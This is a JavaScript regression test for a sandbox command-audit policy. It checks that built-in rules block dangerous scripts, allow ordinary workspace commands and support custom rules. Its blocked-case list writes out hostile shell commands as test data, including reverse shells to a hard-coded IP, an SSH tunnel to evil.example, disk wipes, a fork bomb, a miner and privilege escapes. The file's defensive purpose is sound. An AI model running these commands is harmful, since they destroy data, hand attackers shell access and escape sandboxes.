#!/usr/bin/env node

'use strict';

const assert = require('assert/strict');
const {
    auditSandboxScript,
    listSandboxCommandRules,
    registerSandboxCommandRule,
    unregisterSandboxCommandRule
} = require('../lib/sandbox-command-policy');

// Built-in rules are always present.
const rules = listSandboxCommandRules();
const builtinIds = rules.filter((rule) => rule.builtin).map((rule) => rule.id);
assert.ok(builtinIds.includes('system_destroy_root'), 'root destroy rule missing');
assert.ok(builtinIds.includes('privilege_escape'), 'privilege escape rule missing');
assert.ok(builtinIds.includes('reverse_shell'), 'reverse shell rule missing');
assert.ok(builtinIds.includes('network_scanner'), 'network scanner rule missing');
assert.ok(builtinIds.includes('crypto_miner'), 'miner rule missing');
assert.ok(builtinIds.includes('fork_bomb'), 'fork bomb rule missing');

// Dangerous scripts are blocked with readable reasons.
const blockedCases = [
    ['rm -rf /', 'system_destroy_root'],
    ['rm -fr /*', 'system_destroy_root'],
    ['rm -rf /etc/passwd', 'system_destroy_system_dir'],
    ['mkfs.ext4 /dev/sdb1', 'disk_format'],
    ['dd if=/dev/zero of=/dev/sda bs=1M count=1', 'block_device_write'],
    ['cat /dev/zero > /dev/sda', 'device_redirect'],
    ['sudo whoami', 'privilege_escape'],
    ['chroot /mnt sh', 'privilege_escape'],
    ['nsenter --mount=/proc/1/ns/mnt bash', 'privilege_escape'],
    ['bwrap --ro-bind / /tmp/x sh', 'nested_sandbox'],
    ['modprobe evil', 'kernel_module'],
    ['mount /dev/sdb1 /mnt', 'mount_operation'],
    ['echo 1 > /proc/sys/kernel/panic', 'proc_sys_write'],
    ['nmap -sS 10.0.0.1', 'network_scanner'],
    ['bash -i >& /dev/tcp/8.8.8.8/4444 0>&1', 'reverse_shell'],
    ['nc -e /bin/sh 8.8.8.8 4444', 'reverse_shell'],
    ['ssh -R 8080:localhost:80 root@evil.example', 'remote_transfer'],
    ['./xmrig -o pool.example:3333', 'crypto_miner'],
    ['():(){ :|:& };:', 'fork_bomb'],
    ['echo hacked > /etc/passwd', 'system_file_overwrite'],
    ['shutdown -h now', 'shutdown_reboot'],
    ['kill -9 1', 'kill_critical']
];
for (const [script, expectedId] of blockedCases) {
    const audit = auditSandboxScript(script);
    assert.equal(audit.allowed, false, `should block: ${script}`);
    assert.ok(
        audit.blocked.some((entry) => entry.id === expectedId),
        `expected ${expectedId} for: ${script} (got ${JSON.stringify(audit.blocked.map((b) => b.id))})`
    );
}

// Normal scripting inside /workspace stays allowed.
const allowedCases = [
    'ls -la\npwd',
    'cp input.txt output.txt',
    'mkdir -p /workspace/out && cd /workspace/out && python3 gen.py',
    'zip -r out.zip files/',
    'cat notes.md',
    'rm -rf ./build  # project-local cleanup',
    'rm -f /workspace/tmp.txt',
    'printf "hello" > greeting.txt',
    'cat /dev/null > empty.txt',
    'tar -czf archive.tar.gz /workspace/data',
    'node -e "console.log(1)"'
];
for (const script of allowedCases) {
    assert.equal(auditSandboxScript(script).allowed, true, `should allow: ${script}`);
}

// Custom extension interface: register, hit, unregister.
const customId = registerSandboxCommandRule({
    id: 'test_block_curl',
    reason: 'curl is blocked by the test policy',
    test: (text) => (/\bcurl\b/.test(text) ? 'curl detected' : null)
});
assert.equal(customId, 'test_block_curl');
const customAudit = auditSandboxScript('curl https://example.com');
assert.equal(customAudit.allowed, false);
assert.ok(customAudit.blocked.some((entry) => entry.id === 'test_block_curl'));
assert.ok(listSandboxCommandRules().some((rule) => rule.id === 'test_block_curl' && !rule.builtin));
assert.equal(unregisterSandboxCommandRule('test_block_curl'), true);
assert.equal(auditSandboxScript('curl https://example.com').allowed, true);
assert.equal(unregisterSandboxCommandRule('test_block_curl'), false);
assert.throws(() => registerSandboxCommandRule({ id: 'bad id!', test: () => null }), /sandbox_rule_id_invalid/);
assert.throws(() => registerSandboxCommandRule({ id: 'no-test' }), /sandbox_rule_test_required/);

console.log('sandbox command policy regression passed');